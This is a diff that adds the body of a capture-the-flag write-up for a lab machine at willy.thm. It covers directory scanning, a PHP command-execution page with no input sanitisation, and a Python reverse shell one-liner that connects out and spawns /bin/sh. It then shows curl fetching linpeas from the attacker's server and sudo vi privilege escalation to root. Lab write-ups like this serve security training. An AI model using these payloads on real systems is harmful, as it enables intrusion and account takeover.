@@ -50,4 +50,211 @@
 <p><code>curl -v willy.thm</code></p>
 
 <p><img src="./images/2.png" alt="alt text" /></p>
+
+<p>Manual ways are always great method in web applications. Instead of analyzing entire code, I can reveal (if there is something) more accurate:</p>
+
+<p><img src="./images/3.png" alt="alt text" /></p>
+
+<p>Wappalyzer result:</p>
+
+<p><img src="./images/4.png" alt="alt text" /></p>
+
+<p>I have tried a couple of <code>default user:pass</code> combinations ,but it did not work. We two options from that part:</p>
+
+<ul>
+<li>Direct Fuzzing</li>
+<li>Bruteforce The Panel</li>
+</ul>
+
+<p>Since <code>Fuzzing</code> is more straightforward and achievable at first, I will shift to detect the <code>Endpoints</code> initially.</p>
+
+<p>Run the command I gave you in below:</p>
+
+<h3>Scan for port 80 by default</h3>
+
+<p><code>dirsearch -u willy.thm</code></p>
+
+<p><img src="./images/5.png" alt="alt text" /></p>
+
+<p>First of all, I analyzed <code>/index.php.bak</code> with the help of the <code>mousepad</code> tool. I will show you the source code analysis step by step:</p>
+
+<p>Directly move the correlated endpoint <code>/index.php.bak</code> then it automatically downloads it then rename it as <code>index.php</code>:</p>
+
+<p><code>mv index.php.bak index.php</code></p>
+
+<p>Run mousepad with <code>index.php</code>:
+<code>mousepad index.php</code></p>
+
+<p>Thanks to <a href="https://onecompiler.com/">online compiler</a>, I successfully rendered the page:</p>
+
+<p><img src="./images/6.png" alt="alt text" /></p>
+
+<p>As you can see here we have a command-line interface and execution button. However, <code>$cmd</code> variable directly written as it is. There is no sanitization embedded on variable.</p>
+
+<p><img src="./images/7.png" alt="alt text" /></p>
+
+<p>Whitelisting is great approach for sanitization part. Let me show you how you can achieve:</p>
+
+<p>```
+<?php
+if (isset($<em>POST['command'])) {
+    $cmd = $</em>POST['command'];</p>
+
+<pre><code>$allowed_commands = ['ls', 'pwd', 'whoami'];
+
+if (in_array($cmd, $allowed_commands)) {
+    echo htmlspecialchars(shell_exec($cmd));
+} else {
+    echo "Command not allowed!";
+}
+</code></pre>
+
+<p>}
+?>
+```</p>
+
+<p><code>htmlspecialchars() for XSS sanitization</code>
+<code>$allowed_commands for limited command usage</code>
+(optional)
+only include <code>POST</code> requests:
+<code>if($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; isset($_POST['command']))</code></p>
+
+<p>Let's try common commands on the <code>command</code> field:</p>
+
+<p><img src="./images/8.png" alt="alt text" /></p>
+
+<p>The command directly executed within the <code>onecompiler.com</code> ,so it prevented me to execute it because it has already sanitized on the target. Let's check other path revealed on <code>dirsearch</code> <code>home.php</code>. I encountered the same page and run <code>ls</code> command on input:</p>
+
+<p><img src="./images/9.png" alt="alt text" /></p>
+
+<p><img src="./images/10.png" alt="alt text" /></p>
+
+<p>As you can see here, page rendered as I expected. Reach out other command outputs below:</p>
+
+<p><code>which python</code>:</p>
+
+<p><img src="./images/11.png" alt="alt text" /></p>
+
+<p><code>whoami</code>:</p>
+
+<p><img src="./images/12.png" alt="alt text" /></p>
+
+<p><code>pwd</code>:</p>
+
+<p><img src="./images/13.png" alt="alt text" /></p>
+
+<p>Finally, <code>nmap</code> can be suitable for us to reach anything we did not see yet.
+Basic scan will be enough to discover what we do not know so far:</p>
+
+<p><code>nmap -sV -sC willy.thm</code></p>
+
+<p><img src="./images/22.png" alt="alt text" /></p>
+
+<p>Machine directly tells the endpoint <code>key_rev_key</code> path and downloads the file then  reach the content of the file with <code>cat</code> command:</p>
+
+<p><code>cat key_rev_key</code></p>
+
+<p>Now there was a key leak on this file in the last lines:</p>
+
+<p><img src="./images/23.png" alt="alt text" /></p>
+
+<p>Let's move on privilege escalation part !</p>
+
+<h2>Exploitation</h2>
+
+<p>For the exploitation, <code>Web Shell</code> is a shortest solution for us to handle the session between <code>LHOST</code> and <code>RHOST</code>. Let me get reverse shell by injecting reverse shell payload:</p>
+
+<p>Since we already knew the  occurence of <code>python</code> binary. Using <code>python</code> reverse shell is suitable ,but you can also apply <code>bash</code> reverse shell. Python shell indirectly embeds the <code>Bourne Shell</code> not <code>Bourne Against Shell</code>.</p>
+
+<p><code>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'</code></p>
+
+<p><a href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#perl">Resource of the reverse shell</a></p>
+
+<p><img src="./images/14.png" alt="alt text" /></p>
+
+<p>I got the <code>reverse shell</code>. I examined each step in a detailed way. Do not forget to check the image that I provided you. Now let's try to enhance our shell to upgrade highly compatible <code>/bin/bash</code> + <code>rlwrap</code> to make accessible to command history.</p>
+
+<p><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">Upgrading Reverse Shell</a></p>
+
+<p><code>rlwrap python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p><img src="./images/15.png" alt="alt text" /></p>
+
+<p>The target does not consist of <code>rlwrap</code> binary ,so let's directly upgrade shell.</p>
+
+<p>Now we can observe that we successfully upgraded our shell with the help of the command that I described above.</p>
+
+<p><img src="./images/16.png" alt="alt text" /></p>
+
+<p>First indicator was the initial cursor. It has replaced its status with our current directory. The warning message is a default message.</p>
+
+<p>Findings about OS:
+<code>uname -a</code>
+Linux chocolate-factory 4.15.0-115-generic #116-Ubuntu SMP Wed Aug 26 14:04:49 UTC 2020 x86<em>64 x86</em>64 x86_64 GNU/Linux</p>
+
+<p>Reach <code>user</code> flag from <code>/home/charlie</code> default user directory.</p>
+
+<p><img src="./images/17.png" alt="alt text" /></p>
+
+<p>Still I cannot reach <code>user</code> flag with the permissions of <code>www-data</code> webserver's permissions. However, there was a file located in <code>/home/charlie</code> called <code>teleport.pub</code> then containing a SSH keypair of the charlie. Therefore, it may suitable to try authenticate as charlie.</p>
+
+<p>This is what we need to authenticate as <code>charlie</code>:</p>
+
+<p><img src="./images/18.png" alt="alt text" /></p>
+
+<p><code>ssh -i [somename] user@[IPv4]</code>
+or
+<code>ssh -i [somename] [IPv4]</code></p>
+
+<p>Now I got unprotected permission ,so give 600 permissions to target. Since we have protected file it requires lower permissions:</p>
+
+<p><img src="./images/19.png" alt="alt text" /></p>
+
+<p>Yes ! ! !</p>
+
+<p><img src="./images/20.png" alt="alt text" /></p>
+
+<p>At first, I was not able to read the content of <code>validate.php</code> let's also read that one</p>
+
+<p><img src="./images/21.png" alt="alt text" /></p>
+
+<p>Done ! ! !
+There was a password shown here ,so I have already discovered the open endpoint which is <code>home.php</code>. Obviously, I could not find anything on machine to make myself root. Therefore, <code>linpeas</code> may help me to escalate my privileges to root.</p>
+
+<p>Steps to send <code>linpeas</code> to target:</p>
+
+<p><code>python -m http.server [desired port]</code></p>
+
+<p>On the target machine run the following:</p>
+
+<p><code>curl -O http://[TUN0_IP]:[LPORT]/linpeas.sh</code></p>
+
+<p>After that I encounter with this:</p>
+
+<p><img src="./images/24.png" alt="alt text" /></p>
+
+<p>I captured the most important part of the <code>linpeas</code> output. Do not forget that <code>orange</code> ones indicating critical vulnerabilities.</p>
+
+<p>As you can see on the <code>sudo -l</code> part, <code>charlie</code> can run <code>vi</code> command with root privileges ,so let's move on <code>Get The Fuck Out Binaries</code>.</p>
+
+<p><a href="https://gtfobins.github.io/#vi">Reach out here</a></p>
+
+<p>I used <code>vi</code> binary's privilege escalation vector:</p>
+
+<p><img src="./images/25.png" alt="alt text" /></p>
+
+<p><img src="./images/26.png" alt="alt text" /></p>
+
+<p>Reach the <code>root</code> path to find the flag ,but there was a python file requiring us to give <code>base64</code> encoded passphrase.</p>
+
+<p><img src="./images/27.png" alt="alt text" /></p>
+
+<p>Let me try to use:
+<code>b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='</code></p>
+
+<p><img src="./images/28.png" alt="alt text" /></p>
+
+<p>DONE !</p>
+
+<p>May The Pentest Be With You ! ! !</p>
 </body></html>
